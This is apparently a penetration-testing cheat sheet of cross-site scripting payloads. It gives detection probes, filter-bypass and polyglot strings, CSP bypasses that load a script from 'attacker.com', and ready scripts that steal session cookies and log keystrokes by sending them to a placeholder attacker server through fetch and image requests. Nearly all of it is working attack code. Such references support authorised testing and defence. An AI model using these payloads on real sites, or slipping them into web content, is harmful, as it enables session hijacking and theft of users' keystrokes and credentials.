# XSS — Cross-Site Scripting Payloads

> **Authorized use only.**

## Detection

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
'"><script>alert(1)</script>
javascript:alert(1)
```

**What to look for:**
- Reflected input anywhere in the HTML response
- Input stored and rendered to other users
- Client-side DOM manipulation with `document.write`, `innerHTML`, `location.href`

---

## Basic — Proof of Concept

**When to use:** Confirm XSS is exploitable  
**Risk of detection:** High (alert() is monitored by WAFs)

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**Stealthier PoC — avoid `alert`:**
```html
<script>console.log(document.cookie)</script>
<img src=x onerror=console.log(1)>
<script>fetch('https://your-collaborator.com/?c='+document.cookie)</script>
```

---

## Cookie Stealing

**When to use:** Session hijacking on confirmed XSS  
**Requires:** Cookie without HttpOnly flag  
**Risk of detection:** High

```html
<!-- Send to your server -->
<script>
  new Image().src='https://YOUR-SERVER/?c='+encodeURIComponent(document.cookie);
</script>

<!-- Fetch API -->
<script>
  fetch('https://YOUR-SERVER/?c='+btoa(document.cookie));
</script>

<!-- One-liner img tag -->
<img src=x onerror="this.src='https://YOUR-SERVER/?c='+document.cookie">
```

---

## Keylogger (Stored XSS)

**When to use:** Stored XSS on a high-value form — CTF/lab demo  
**Risk of detection:** High

```html
<script>
  document.onkeypress = function(e) {
    fetch('https://YOUR-SERVER/?k=' + e.key);
  };
</script>
```

---

## DOM-Based XSS

**When to use:** When input is processed by JavaScript, not reflected in server response  
**Common sinks:** `innerHTML`, `document.write`, `location.href`, `eval`

```javascript
// URL fragment injection (#)
// If JS does: element.innerHTML = location.hash.slice(1)
https://target.com/page#<img src=x onerror=alert(1)>

// document.write sink
https://target.com/?name=<script>alert(1)</script>

// eval sink
https://target.com/?callback=alert(1)
```

---

## Filter Bypass

**When to use:** Input is filtered but XSS may still be possible  
**Risk of detection:** Medium

### When `<script>` is filtered

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<body/onload=alert(1)>
<iframe onload=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

### When `on*` events are filtered

```html
<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">click</text></a></svg>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
```

### When quotes are filtered

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### When spaces are filtered

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### When angle brackets are encoded

```
Try in attribute context:
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onmouseover='alert(1)
```

### Case variation

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<sVg OnLoAd=alert(1)>
```

### HTML entity encoding

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

---

## Polyglots — Work in Multiple Contexts

**When to use:** Unknown injection context  
**Risk of detection:** Low — single payload, multiple contexts

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```html
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

Short polyglot:
```
'"><img src=x onerror=alert(1)>
```

---

## Content Security Policy (CSP) Bypass

**When to use:** Target has CSP but has whitelisted unsafe or external domains  
**Risk of detection:** Low

```html
<!-- If script-src includes 'unsafe-inline' -->
<script>alert(1)</script>

<!-- If script-src includes a CDN you can abuse (JSONP endpoint) -->
<script src="https://whitelisted-cdn.com/jsonp?callback=alert(1)"></script>

<!-- If script-src includes 'strict-dynamic' and nonce -->
<!-- Inject via trusted script using DOM -->

<!-- If default-src is too permissive -->
<script src="https://attacker.com/evil.js"></script>
```

---

## Tools Reference

| Tool | Use |
|------|-----|
| `dalfox` | Automated XSS scanner |
| Burp Suite Scanner | Passive/active XSS detection |
| XSSHunter | Blind XSS callbacks |
| `kxss` | Quick URL parameter testing |
